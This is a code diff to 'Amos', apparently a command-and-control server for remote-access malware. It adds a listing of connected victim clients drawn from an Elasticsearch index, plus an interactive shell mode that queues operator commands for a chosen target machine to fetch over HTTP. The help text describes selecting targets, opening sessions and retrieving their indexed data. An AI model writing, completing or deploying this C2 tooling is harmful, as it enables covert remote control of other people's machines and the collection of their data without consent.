@@ -1,7 +1,7 @@
 import threading
 from HttpHandler import MyHandler
 from http.server import HTTPServer
-from server_settings import SERVER_IP, SERVER_PORT, ES_HANDLER
+from server_settings import SERVER_IP, SERVER_PORT, ES_HANDLER, CONNECTED_CLIENTS
 
 
 art = """
@@ -22,21 +22,22 @@ class Amos:
     def __init__(self):
         # Initialize the HTTP server but don't start it yet
         self.server = HTTPServer((SERVER_IP, SERVER_PORT), MyHandler)
+        self.active_client = None;
 
 
-    # displays caesar shell commands
+    # display shell commands
     def show_commands(self):
         user_guide = """
             Amos Commands
                  'guide': [Display Amos user commands]
-                 'clients':['lists clients within ES index']
-                 'connected':['lists all active connection within ES index']
+                 'clients':['Display clients within ES index']
+                 'connected':['Display all active connection within ES index']
                  'shell (target ES Client_ID)':['selects a target and creates a session between the server and the client machine ']
                  'delete (target ES Client_ID)': ['remove specified document from index']
                  'delete all': ['remove all document from index']
                  'get (target ES Client_ID)': ['retrieves indexed data of specified target ']
-                 'show fields (target ES Client_ID)': ['displays existing field for specified target']
-                 'field (target ES Client_ID) (FIELD NAME):  ['displays specified field']
+                 'show fields (target ES Client_ID)': ['Displays existing field for specified target']
+                 'field (target ES Client_ID) (FIELD NAME):  ['Displays specified field']
             """
         print(user_guide)
 
@@ -45,16 +46,31 @@ class Amos:
 
         while True:
             cmd = input(MyHandler.convert_text("Amos: "))
-
             if cmd.strip() == "":
                 pass
             elif cmd == 'connected':
-                pass
+                client_info = [ES_HANDLER.get_client_data(client_id) for client_id in CONNECTED_CLIENTS]
+                ES_HANDLER.tabulate_data(client_info)
+
             elif cmd.strip() == "":
                 pass 
 
-            elif cmd.startswith('shell '):
-                pass
+            elif cmd.startswith('shell'):
+                # Start session with the specified client
+                target_client = cmd.split()[1]
+                print(f"Starting session with {target_client}")
+                self.active_client = target_client  # Set active client session
+
+                # Enter interactive mode for continuous communication
+                while True:
+                    command = input(f"{target_client}: ")
+                    if command.lower() == "exit":
+                        print("Exiting shell session.")
+                        self.active_client = None  # Clear active client
+                        break
+                    # Store or send command to be retrieved by `do_GET`
+                    MyHandler.pending_command = command
+                    # Optionally, wait for a response (if using async communication)
 
             elif cmd.strip() == "clients":
                 cmd = cmd.strip().lower()
@@ -123,6 +139,3 @@ if __name__ == '__main__':
     amos_server = Amos()
     amos_server.show_commands()
     amos_server.start()
-
-
-
